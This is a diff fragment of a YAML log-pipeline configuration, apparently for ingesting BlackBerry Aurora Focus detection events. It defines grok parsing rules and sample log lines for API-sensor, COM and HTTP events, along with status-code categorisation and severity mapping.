+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Consumer Text:
+              %{PARSE_TILL_COMMA2:consumer_text}, Consumer Text Length:
+              (%{integer:consumer_text_length})?, Operation:
+              %{PARSE_TILL_COMMA2:operation}, Operation Length:
+              (%{integer:operation_length})?, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing Aurora Focus API Sensor Based Detection Events
+      enabled: true
+      filter:
+        query: "@evt.name:OpticsCaeApiEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus API Sensor Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: SECURITYSERVER3, Zone Names: (ZoneOne,ZoneTwo),
+              Event Id: d29ee101-a2a2-42f1-b9ab-7e4b18aeeef1, Severity: High,
+              Description: Test - API Sensor, High priority event, Instigating
+              Process Name: IReadCredentials.exe, Instigating Process Owner:
+              PENTEST//Administrator, Instigating Process ImageFileSha256:
+              E24F5A2B51EC1C260388348AF764B8794CE0566749F5801D024B7B422C63DC56,
+              Event Timestamp: 2022-09-28T14:23:37.384Z, Event Received
+              Timestamp: 2022-09-28T14:24:30Z, Device Last Reported Users:
+              (PENTEST\\Administrator), Zone Ids:
+              (F568A8A8E401470282C1FE98FDD1703A,161EB91D79D6466A80182CF685FA7CA\
+              A), Detection Rule Id: be7403ca-a9f4-4aa7-ad6d-7c672bfa8fc9,
+              Instigating Process Command Line: IReadCredentials.exe,
+              Instigating Process File Path:
+              c:\\apisensor\\ireadcredentials.exe, API DLL: Advapi32.dll, API
+              Function: CredEnumerateW, API Parameters: Unknown"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_api_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{data:zone_names}, Event Id: (%{notSpace:event_id})?,
+              Severity: (%{notSpace:severity})?, Description:
+              %{PARSE_TILL_COMMA:description}, Instigating Process Name:
+              %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating Process
+              Owner: %{PARSE_TILL_COMMA2:instigating_process_owner}, Instigating
+              Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA2:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, API DLL:
+              %{PARSE_TILL_COMMA2:api_dll}, API Function:
+              %{PARSE_TILL_COMMA2:api_function}, API Parameters:
+              %{regex("[^$]*"):api_parameters}'
+    - type: pipeline
+      name: Processing Aurora Focus COM Based Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeComEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus COM Based Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - 'Device Name: DEVICE-W19, Zone Names: (Zone_3.x), Event Id:
+              9e5ac116-a20c-4929-9087-10fd7fdcb105, Severity: High, Description:
+              Device - Application COM Event, Instigating Process Name:
+              GoogleUpdate.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM,
+              Instigating Process ImageFileSha256:
+              63854E78780866D2AE56A58958A1FDA017A71F54B71FE70CF5403958E961862A,
+              Event Timestamp: 2023-08-23T07:28:59.588Z, Event Received
+              Timestamp: 2023-08-23T07:29:01Z, Device Last Reported Users:
+              (Window Manager\DWM-1), Zone Ids:
+              (D215191148D64DEE826768B62D64B244), Detection Rule Id:
+              15b11fa2-fc61-4aa3-aa04-082c488f8a86, Instigating Process Command
+              Line: "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"
+              /svc, Instigating Process File Path: c:\program files
+              (x86)\google\update\googleupdate.exe, COM Interface ID:
+              2933bf81-7b36-11d2-b20e-00c04f983e60, COM Program: msxml, COM
+              Interface: IXMLDOMDocument, Device Id:
+              744ac660-9704-4edb-a8d0-ae13a343f3bf'
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_com_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, COM Interface
+              ID: %{PARSE_TILL_COMMA2:com_interface_id}, COM Program:
+              %{PARSE_TILL_COMMA2:com_program}, COM Interface:
+              %{PARSE_TILL_COMMA2:com_interface}, Device Id:
+              (%{notSpace:device_id})?'
+    - type: pipeline
+      name: Processing of Aurora Focus HTTP Visibility Detection Events
+      enabled: true
+      filter:
+        query: "@event_type:OpticsCaeHttpEvent"
+      processors:
+        - type: grok-parser
+          name: Parsing Aurora Focus HTTP Visibility Detection Events
+          enabled: true
+          source: additional_details
+          samples:
+            - "Device Name: DEVICE-W19, Zone Names: (Zone_3.x), Event Id:
+              41ea5ce4-6501-4c13-a7a2-80f9afec9eee, Severity: High, Description:
+              DEVICE - Trigger on ANY http sensor event, Instigating Process
+              Name: svchost.exe, Instigating Process Owner: NT
+              AUTHORITY//SYSTEM, Instigating Process ImageFileSha256:
+              2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,
+              Event Timestamp: 2023-08-23T15:48:52.992Z, Event Received
+              Timestamp: 2023-08-23T15:48:57Z, Device Last Reported Users:
+              (RIMNET\\adminuser,Window Manager\\DWM-1,Window Manager\\DWM-2),
+              Zone Ids: (D215191148D64DEE826768B62D64B244), Detection Rule Id:
+              9a82a2d3-e6b0-4177-9bac-80ba5b1ef982, Instigating Process Command
+              Line: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc,
+              Instigating Process File Path: c:\\windows\\system32\\svchost.exe,
+              Device Id: 744ac660-9704-4edb-a8d0-ae13a343f3bf, User Agent:
+              Microsoft-CryptoAPI/10.0, Request Domain: ocsp.digicert.com,
+              Request Path:
+              /MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA9\
+              5QNVbRTLtm8KPiGxvDl7I90VUCEAJ0LqoXyo4hxxe7H%2Fz9DKA%3D, Request
+              Method: GET, Request Port: 80, Request Version: HTTP/1.1, Request
+              Headers: 0, Request Length: 0, Response Status: 0, Response
+              Headers: 0, Response Length: 0"
+          grok:
+            supportRules: |-
+              PARSE_TILL_COMMA %{regex("(.*)(?=,)")}
+              PARSE_TILL_COMMA2 %{regex("[^,]*")}
+            matchRules: 'parse_http_rule Device Name: %{PARSE_TILL_COMMA2:device_name}, Zone
+              Names: %{PARSE_TILL_COMMA:zone_names}, Event Id:
+              (%{notSpace:event_id})?, Severity: (%{notSpace:severity})?,
+              Description: %{PARSE_TILL_COMMA2:description}, Instigating Process
+              Name: %{PARSE_TILL_COMMA2:instigating_process_name}, Instigating
+              Process Owner: %{PARSE_TILL_COMMA2:instigating_process_owner},
+              Instigating Process ImageFileSha256:
+              (%{notSpace:instigating_process_imagefilesha256})?, Event
+              Timestamp: %{PARSE_TILL_COMMA2:event_timestamp}, Event Received
+              Timestamp: %{PARSE_TILL_COMMA2:event_received_timestamp}, Device
+              Last Reported Users:
+              %{data:device_last_reported_users:array("()",",")}, Zone Ids:
+              %{notSpace:zone_ids}, Detection Rule Id:
+              (%{notSpace:detection_rule_id})?, Instigating Process Command
+              Line: %{PARSE_TILL_COMMA:instigating_process_command_line},
+              Instigating Process File Path:
+              %{PARSE_TILL_COMMA2:instigating_process_file_path}, Device Id:
+              (%{notSpace:device_id})?, User Agent:
+              %{PARSE_TILL_COMMA2:http.useragent}, Request Domain:
+              %{PARSE_TILL_COMMA2:dns.question.name}, Request Path:
+              %{PARSE_TILL_COMMA2:request_path}, Request Method:
+              (%{notSpace:request_method})?, Request Port:
+              (%{port:request_port})?, Request Version:
+              %{PARSE_TILL_COMMA2:request_version}, Request Headers:
+              %{PARSE_TILL_COMMA2:request_headers}, Request Length:
+              (%{integer:request_length})?, Response Status:
+              %{PARSE_TILL_COMMA2:response_status}, Response Headers:
+              %{PARSE_TILL_COMMA2:response_headers}, Response Length:
+              (%{integer:response_length})?'
+        - type: user-agent-parser
+          name: Parsing `http.useragent`
+          enabled: true
+          sources:
+            - http.useragent
+          target: http.useragent_details
+          encoded: false
+          combineVersionDetails: false
+        - type: category-processor
+          name: Categorize status code
+          enabled: true
+          categories:
+            - filter:
+                query: "@response_status:[200 TO 299]"
+              name: Successful
+            - filter:
+                query: "@response_status:[300 TO 399]"
+              name: Redirection
+            - filter:
+                query: "@response_status:[400 TO 499]"
+              name: Client Error
+            - filter:
+                query: "@response_status:[500 TO 599]"
+              name: Server Error
+            - filter:
+                query: "@response_status:[0 TO 199]"
+              name: Informational
+          target: http.status_category
+    - type: pipeline
+      name: Processing Aurora Focus Detection Events
+      enabled: true
+      filter:
+        query: service:detection-events
+      processors:
+        - name: Lookup on `severity` to `status`
+          enabled: true
+          source: severity
+          target: status
+          lookupTable: |-
+            High,critical
+            Medium,warning
+            Low,info
+            Info,info
+            Informational,info
+          type: lookup-processor
+    - type: status-remapper
+      name: Define `status` as the official status of the log
+      enabled: true
+      sources:
+        - status
+    - type: string-builder-processor
+      name: Reset `additional_details` attribute
+      enabled: true
+      template: "%{resolve_to_empty_string}"
+      target: additional_details
+      replaceMissing: true
